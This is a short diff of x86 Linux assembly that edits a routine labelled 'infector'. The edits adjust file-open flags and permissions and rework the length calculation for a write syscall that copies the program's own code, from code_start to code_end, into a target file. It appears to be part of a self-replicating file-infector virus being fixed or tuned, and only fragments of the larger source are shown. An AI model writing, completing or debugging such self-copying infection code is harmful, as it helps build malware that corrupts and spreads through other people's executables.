@@ -6,8 +6,8 @@ section .data
     WRITE EQU 4
     OPEN EQU 5
     CLOSE EQU 6
-    PERMISSIONS EQU 0777
-    O_FLAGS EQU 1024
+    PERMISSIONS EQU 0644
+    O_FLAGS EQU 1025
 
 section .text
 global _start
@@ -87,7 +87,8 @@ infector:
     mov     eax, WRITE
     mov     ebx, dword [outfile]
     mov     ecx, code_start
-    mov     edx, code_end - code_start
+    mov     edx, code_end
+    sub     edx, code_start
     int     0x80
 
     ; Close file
